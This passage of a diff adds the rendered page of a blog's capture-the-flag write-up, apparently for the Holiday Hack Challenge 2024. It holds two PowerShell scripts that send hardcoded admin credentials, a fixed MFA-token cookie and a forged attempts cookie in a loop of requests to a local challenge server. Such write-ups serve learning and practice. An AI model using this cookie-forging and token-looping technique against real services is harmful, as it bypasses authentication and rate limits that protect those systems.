+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$credentials</span> = [<span style="color:#ff9f43">Convert</span>]::ToBase64String([<span style="color:#ff9f43">Text.Encoding</span>]::ASCII.GetBytes((<span style="color:#ff5c57">$username</span> + <span style="color:#5af78e">&#34;:&#34;</span> + <span style="color:#ff5c57">$password</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$BasicAuth</span> = <span style="color:#5af78e">&#34;Basic </span><span style="color:#ff5c57">$credentials</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$Headers</span> = @{ Authorization = <span style="color:#ff5c57">$BasicAuth</span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Number of repetitions for looping</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$repetitions</span> = <span style="color:#ff9f43">11</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> (<span style="color:#ff5c57">$i</span> = <span style="color:#ff9f43">1</span>; <span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">-lt</span> <span style="color:#ff5c57">$repetitions</span>; <span style="color:#ff5c57">$i</span>++) {
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Loop through the result 11 times</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">foreach</span> (<span style="color:#ff5c57">$endpoint</span> <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">$result</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Create a new web request session</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$session</span> = <span style="color:#ff5c57">New-Object</span> Microsoft.PowerShell.Commands.WebRequestSession
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Configure the cookies</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$cookie1</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;token&#39;</span>, <span style="color:#ff5c57">$endpoint</span>.token)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$cookie1</span>.Domain = <span style="color:#5af78e">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$cookie2</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;mfa_token&#39;</span>, <span style="color:#5af78e">&#39;9932994526.5978212&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$cookie2</span>.Domain = <span style="color:#5af78e">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$session</span>.Cookies.Add(<span style="color:#ff5c57">$cookie1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$session</span>.Cookies.Add(<span style="color:#ff5c57">$cookie2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Define the API endpoint</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$link</span> = <span style="color:#5af78e">&#34;http://127.0.0.1:1225/tokens/</span>$(<span style="color:#ff5c57">$endpoint</span>.hash)<span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Send the GET request with cookies and authorization header</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$request</span> = <span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$link</span> -WebSession <span style="color:#ff5c57">$session</span> -Headers <span style="color:#ff5c57">$Headers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Check if the request was successful</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$request</span>.StatusCode <span style="color:#ff6ac1">-eq</span> <span style="color:#ff9f43">200</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># Output the endpoint and response content</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">Write-Output</span> <span style="color:#ff5c57">$request</span>.Content
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># Parse the outerHTML string from the response</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">$outerHTML</span> = <span style="color:#ff5c57">$request</span>.Links.outerHTML
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># Regex pattern to extract the href value and the link text</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">$pattern</span> = <span style="color:#5af78e">&#34;&lt;a href=&#39;([^&#39;]*)&#39;&gt;([^&lt;]*)&lt;/a&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># Match the outerHTML with the regex pattern</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$outerHTML</span> <span style="color:#ff6ac1">-match</span> <span style="color:#ff5c57">$pattern</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$hrefValue</span> = <span style="color:#ff5c57">$matches</span>[<span style="color:#ff9f43">1</span>]
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$linkText</span> = <span style="color:#ff5c57">$matches</span>[<span style="color:#ff9f43">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$baseUrl</span> = <span style="color:#5af78e">&#34;http://127.0.0.1:1225&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$fullUrl</span> = <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$baseUrl$linkText</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">-lt</span> <span style="color:#ff9f43">10</span>){
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff5c57">$value</span> = <span style="color:#5af78e">&#34;0</span>$(<span style="color:#ff5c57">$i</span>)<span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">-eq</span> <span style="color:#ff9f43">10</span>){
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff5c57">$value</span> = <span style="color:#5af78e">&#34;10&#34;</span>
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$cookie3</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;attempts&#39;</span>, <span style="color:#5af78e">&#34;c25ha2VvaWwK</span><span style="color:#ff5c57">$value</span><span style="color:#5af78e">&#34;</span>, <span style="color:#5af78e">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$cookie3</span>.Domain = <span style="color:#5af78e">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$session</span>.Cookies.Add(<span style="color:#ff5c57">$cookie3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#78787e"># Follow the link</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$secondaryResponse</span> = <span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$fullUrl</span> -WebSession <span style="color:#ff5c57">$session</span> -Headers <span style="color:#ff5c57">$Headers</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$secondaryResponse</span>.StatusCode <span style="color:#ff6ac1">-eq</span> <span style="color:#ff9f43">500</span>){
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#78787e"># Output the response content</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">Write-Output</span> <span style="color:#ff5c57">$secondaryResponse</span>.Content
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">Start-Sleep</span> -Seconds <span style="color:#ff9f43">0.2</span>
+</span></span><span style="display:flex;"><span>                } 
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><ul>
+<li>I got gold 🥇 following script:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#78787e"># Define the hashes as a comma-separated string</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$temp_hash</span> = <span style="color:#5af78e">&#34;32b9401a6d972f8c1a98de145629ea9d,3a79238df0a92ab0afa44a85f914fc3b,49c2a68b21b9982aa9fd64cf0fd79f72,f8142c1304efb9b7e9a7f57363c2d286,706457f6dd78729a8bed5bae1efaeb50,bb0564aa5785045937a35a9fa3fbbc73,4173a7bc22aee35c5fc48261b041d064,198b8bf2cd30a7c7fed464cca1720a88,3a7c8ecffeeadb164c31559f8f24a1e7,288e60e318d9ad7d70d743a614442ffc,87ab4cb29649807fdb716ac85cf560ea,89f3ec1275407c9526a645602d56e799,33539252b40b5c244b09aee8a57adbc9,152899789a191d9e9150a1e3a5513b7f,7cd48566f118a02f300cdfa75dee7863,d798a55fca64118cea2df3c120f67569,6ef5570cd43a3ec9f43c57f662201e55,bf189d47c3175ada98af398669e3cac3,743ac25389a0b430dd9f8e72b2ec9d7f,270aabd5feaaf40185f2effa9fa2cd6e,8b58850ee66bd2ab7dd2f5f850c855f8,6fd00cbda10079b1d55283a88680d075,612001dd92369a7750c763963bc327f0,010f2cc580f74521c86215b7374eead6,29860c67296d808bc6506175a8cbb422,7b7f6891b6b6ab46fe2e85651db8205f,45ffb41c4e458d08a8b08beeec2b4652,d0e6bfb6a4e6531a0c71225f0a3d908d,bd7efda0cb3c6d15dd896755003c635c,5be8911ced448dbb6f0bd5a24cc36935,1acbfea6a2dad66eb074b17459f8c5b6,0f262d0003bd696550744fd43cd5b520,8cac896f624576d825564bb30c7250eb,8ef6d2e12a58d7ec521a56f25e624b80,b4959370a4c484c10a1ecc53b1b56a7d,38bdd7748a70529e9beb04b95c09195d,8d4366f08c013f5c0c587b8508b48b15,67566692ca644ddf9c1344415972fba8,8fbf4152f89b7e309e89b9f7080c7230,936f4db24a290032c954073b3913f444,c44d8d6b03dcd4b6bf7cb53db4afdca6,cb722d0b55805cd6feffc22a9f68177d,724d494386f8ef9141da991926b14f9b,67c7aef0d5d3e97ad2488babd2f4c749&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># $temp_hash = &#34;5f8dd236f862f4507835b0e418907ffc&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Split the hashes into an array</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$temp_hash</span> = <span style="color:#ff5c57">$temp_hash</span>.Split(<span style="color:#5af78e">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Generate temporary files for each hash</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">foreach</span> (<span style="color:#ff5c57">$hash</span> <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">$temp_hash</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">Set-Content</span> -Path <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$hash</span><span style="color:#5af78e">.txt&#34;</span> -Value <span style="color:#ff5c57">$hash</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Get the list of temporary files</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$temp_files</span> = <span style="color:#ff5c57">Get-ChildItem</span> -Filter *.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Calculate file hashes and prepare the result object</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$result</span> = <span style="color:#ff6ac1">foreach</span> (<span style="color:#ff5c57">$file</span> <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">$temp_files</span>) {
+</span></span><span style="display:flex;"><span>    [<span style="color:#ff9f43">PSCustomObject</span>]@{
+</span></span><span style="display:flex;"><span>        hash  = (<span style="color:#ff5c57">Get-FileHash</span> <span style="color:#ff5c57">$file</span>.FullName).Hash
+</span></span><span style="display:flex;"><span>        token = <span style="color:#ff5c57">$file</span>.Name <span style="color:#ff6ac1">-replace</span> <span style="color:#5af78e">&#34;\.txt$&#34;</span>, <span style="color:#5af78e">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Remove the temporary files</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Remove-Item</span> *.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Basic authentication setup</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$username</span> = <span style="color:#5af78e">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$password</span> = <span style="color:#5af78e">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$credentials</span> = [<span style="color:#ff9f43">Convert</span>]::ToBase64String([<span style="color:#ff9f43">Text.Encoding</span>]::ASCII.GetBytes((<span style="color:#ff5c57">$username</span> + <span style="color:#5af78e">&#34;:&#34;</span> + <span style="color:#ff5c57">$password</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$BasicAuth</span> = <span style="color:#5af78e">&#34;Basic </span><span style="color:#ff5c57">$credentials</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$Headers</span> = @{ Authorization = <span style="color:#ff5c57">$BasicAuth</span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Number of repetitions for looping</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$repetitions</span> = <span style="color:#ff9f43">11</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> (<span style="color:#ff5c57">$i</span> = <span style="color:#ff9f43">1</span>; <span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">-lt</span> <span style="color:#ff5c57">$repetitions</span>; <span style="color:#ff5c57">$i</span>++) {
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Loop through the result 11 times</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">foreach</span> (<span style="color:#ff5c57">$endpoint</span> <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">$result</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Create a new web request session</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$session</span> = <span style="color:#ff5c57">New-Object</span> Microsoft.PowerShell.Commands.WebRequestSession
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Configure the cookies</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$cookie1</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;token&#39;</span>, <span style="color:#ff5c57">$endpoint</span>.token)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$cookie1</span>.Domain = <span style="color:#5af78e">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$cookie2</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;mfa_token&#39;</span>, <span style="color:#5af78e">&#39;9932994526.5978212&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$cookie2</span>.Domain = <span style="color:#5af78e">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$session</span>.Cookies.Add(<span style="color:#ff5c57">$cookie1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$session</span>.Cookies.Add(<span style="color:#ff5c57">$cookie2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Define the API endpoint</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$link</span> = <span style="color:#5af78e">&#34;http://127.0.0.1:1225/tokens/</span>$(<span style="color:#ff5c57">$endpoint</span>.hash)<span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Send the GET request with cookies and authorization header</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$request</span> = <span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$link</span> -WebSession <span style="color:#ff5c57">$session</span> -Headers <span style="color:#ff5c57">$Headers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e"># Check if the request was successful</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$request</span>.StatusCode <span style="color:#ff6ac1">-eq</span> <span style="color:#ff9f43">200</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># Output the endpoint and response content</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">Write-Output</span> <span style="color:#ff5c57">$request</span>.Content
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># Parse the outerHTML string from the response</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">$outerHTML</span> = <span style="color:#ff5c57">$request</span>.Links.outerHTML
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># Regex pattern to extract the href value and the link text</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">$pattern</span> = <span style="color:#5af78e">&#34;&lt;a href=&#39;([^&#39;]*)&#39;&gt;([^&lt;]*)&lt;/a&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># Match the outerHTML with the regex pattern</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$outerHTML</span> <span style="color:#ff6ac1">-match</span> <span style="color:#ff5c57">$pattern</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$hrefValue</span> = <span style="color:#ff5c57">$matches</span>[<span style="color:#ff9f43">1</span>]
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$linkText</span> = <span style="color:#ff5c57">$matches</span>[<span style="color:#ff9f43">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$baseUrl</span> = <span style="color:#5af78e">&#34;http://127.0.0.1:1225&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$fullUrl</span> = <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$baseUrl$linkText</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#78787e">#spaghetti from debug of 500 Error</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">-lt</span> <span style="color:#ff9f43">10</span>){
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff5c57">$value</span> = <span style="color:#5af78e">&#34;0</span>$(<span style="color:#ff5c57">$i</span>)<span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">-eq</span> <span style="color:#ff9f43">10</span>){
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff5c57">$value</span> = <span style="color:#5af78e">&#34;10&#34;</span>
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#78787e"># Setup of cookies needed for the last bit of the loop</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$cookie3</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;attempts&#39;</span>, <span style="color:#5af78e">&#34;c25ha2VvaWwK</span><span style="color:#ff5c57">$value</span><span style="color:#5af78e">&#34;</span>, <span style="color:#5af78e">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$cookie3</span>.Domain = <span style="color:#5af78e">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$session</span>.Cookies.Add(<span style="color:#ff5c57">$cookie3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#78787e"># Follow the link</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">$secondaryResponse</span> = <span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$fullUrl</span> -WebSession <span style="color:#ff5c57">$session</span> -Headers <span style="color:#ff5c57">$Headers</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">if</span> (<span style="color:#ff5c57">$secondaryResponse</span>.StatusCode <span style="color:#ff6ac1">-eq</span> <span style="color:#ff9f43">500</span>){
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#78787e"># Output the response content</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">Write-Output</span> <span style="color:#ff5c57">$secondaryResponse</span>.Content
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff5c57">Start-Sleep</span> -Seconds <span style="color:#ff9f43">0.2</span>
+</span></span><span style="display:flex;"><span>                } 
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3 id="see-also-in-hhc24">
+        See also in HHC24
+        <a class="heading-link" href="#see-also-in-hhc24">
+          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+          <span class="sr-only">Link to heading</span>
+        </a>
+      </h3>
+      <nav>
+        <ul>
+        
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/frostbitdeactivation/">HHC24 - Frostbit Deactivation</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/elfstack/">HHC24 - ElfStack</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/santavision/">HHC24 - SantaVision</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/dronmagedon/">HHC24 - Dronmagedon</a>
+            </li>
+          
+        
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/snowball-showdown/">HHC24 - Snowball-Showdown</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     ArmBraker 👨‍💻 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/blog/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
